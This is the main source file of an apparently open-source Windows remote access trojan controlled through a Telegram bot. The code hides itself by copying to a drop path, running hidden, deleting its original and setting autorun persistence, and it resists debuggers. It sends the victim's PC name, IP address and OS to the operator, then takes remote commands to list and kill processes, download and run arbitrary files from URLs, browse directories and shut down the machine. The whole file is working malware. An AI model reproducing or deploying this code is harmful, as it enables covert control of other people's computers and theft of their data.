/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "common.h"
#include "Manager.h"
#include "Telegram.h"

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
	srand((unsigned int)time(NULL));
	Settings s;
	ReadData(&s);

	char me[128] = { 0 };
	GetModuleFileNameA(0, me, sizeof(me) - 1);

	if (s.drop_run) {
		if (std::string(me) != s.drop) {
			CopyFileA(me, s.drop, false);
			ShellExecuteA(0, "open", s.drop, 0, 0, SW_HIDE);

			if (s.auto_delete) {
				std::string batch_autodel = "C:\\Users\\system.bat";
				std::ofstream bat(batch_autodel);
				bat << "@echo off\n";
				bat << "del " + std::string(me);
				bat << "\ndel " + batch_autodel;
				bat.close();

				ShellExecuteA(0, "open", batch_autodel.c_str(), 0, 0, SW_HIDE);
			}

			return 0;
		}
	}

	if (s.autorun_state) {
		Autorun(s.autorun);
	}

	if (s.protect_debuggers) {
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector, 0, 0, 0);
	}

	Telegram api(s.botapi);

	int ID = rand();
	std::string information = "User ID: " + std::to_string(ID) + "%0A"
		"Name: " + GetPCName() + "%0A"
		"IP: " + GetIP() + "%0A"
		"OS: " + GetOS() + "%0A"
		"For send command to this user, type: /user" + std::to_string(ID) + " command";
	api.SendTextMessage(s.chatid, information.c_str());

	std::string last;
	

	std::string prefix = "/user" + std::to_string(ID) + " ";

	std::vector<std::string> params;
	while (true) {
		Sleep(atoi(s.client_delay));

		last = api.GetLastMessageText(atoi(s.chatid));
		if (last.substr(0, prefix.size()) == prefix) {
			std::string command = last.replace(last.find(prefix), prefix.size(), "");
			params = split(command, ' ');

			// PROCESS MANAGER
			// processes
			if (command == "processes") {
				std::string processes = prefix + "%0A%0A" + ProcessList();
				if (processes != "") {
					api.SendTextMessage(s.chatid, processes.c_str());
				}
			}

			// closeproc process.exe
			else if (params[0] == "closeproc") {
				if (CloseProcessByName(params[1])) {
					std::string text = prefix + "%0A Success! Process is closed!";
					api.SendTextMessage(s.chatid, text.c_str());
				}
				else {
					std::string text = prefix + "%0A Error! Process isn't closed!";
					api.SendTextMessage(s.chatid, text.c_str());
				}
			}

			// loader https://google.com C:\File.exe
			else if (params[0] == "loader") {
				URLDownloadToFileA(0, params[1].c_str(), params[2].c_str(), 0, 0);
				if (FileExists(params[2])) {
					std::string text = prefix + "%0A Success! File is uploaded to: " + params[2];
					api.SendTextMessage(s.chatid, text.c_str());
				}
				else {
					std::string text = prefix + "%0A Error! File not uploaded!";
					api.SendTextMessage(s.chatid, text.c_str());
				}
			}

			// run C:\File.exe
			else if (params[0] == "run") {
				if (params.size() == 2) {
					ShellExecuteA(0, "open", params[1].c_str(), params[2].c_str(), 0, 0);
					std::string text = prefix + "%0A Runned with arguments!";
					api.SendTextMessage(s.chatid, text.c_str());
				}
				else {
					ShellExecuteA(0, "open", params[1].c_str(), 0, 0, 0);
					std::string text = prefix + "%0A Runned without arguments!";
					api.SendTextMessage(s.chatid, text.c_str());
				}
			}

			// JOKES
			// disable pc
			else if (command == "disable pc") {
				system("shutdown -s");
			}

			// close
			else if (command == "close") {
				ExitProcess(0);
			}

			// disable display
			else if (command == "disable display") {
				SendMessage(NULL, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
			}

			// FILE MANAGER
			// dir C:\Folder
			else if (params[0] == "dir") {
				// if only dir
				if (params[1] == "del_file") {
					DeleteFileA(params[1].c_str());
				}
				else {
					std::string objects = prefix + "%0A" + DirectoryObjectsList(params[1]);
					if (objects != "") {
						api.SendTextMessage(s.chatid, objects.c_str());
					}
					else {
						std::string text = prefix + "%0A Error! Files not found";
						api.SendTextMessage(s.chatid, text.c_str());
					}
				}
			}
		}
		else if (last == "/online") {
			api.SendTextMessage(s.chatid, information.c_str());
		}
	}

	return 0;
}